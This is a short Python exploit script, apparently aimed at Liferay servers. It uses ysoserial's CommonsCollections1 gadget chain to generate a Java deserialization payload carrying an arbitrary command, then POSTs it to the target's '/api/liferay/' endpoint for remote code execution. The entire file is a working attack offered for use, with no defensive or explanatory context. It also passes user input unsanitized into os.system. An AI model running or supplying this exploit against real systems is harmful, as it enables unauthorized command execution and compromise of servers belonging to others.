import requests
import os
import argparse

def getCommand():
	parser = argparse.ArgumentParser(description="Put some argument")
	parser.add_argument('--url')
	parser.add_argument('--command')
	args = parser.parse_args()
	return args.url, args.command  

def getPayload(command):
    payload = os.system('java -jar ysoserial.jar CommonsCollections1 ' + command + ' > shell')
    return payload

def sendPayload(url, payload):
    url = url + '/api/liferay/'
    shell = open('shell', 'rb')
    x = requests.post(url, data = shell)
    
url, command = getCommand()
payload = getPayload(command)
sendPayload(url, payload)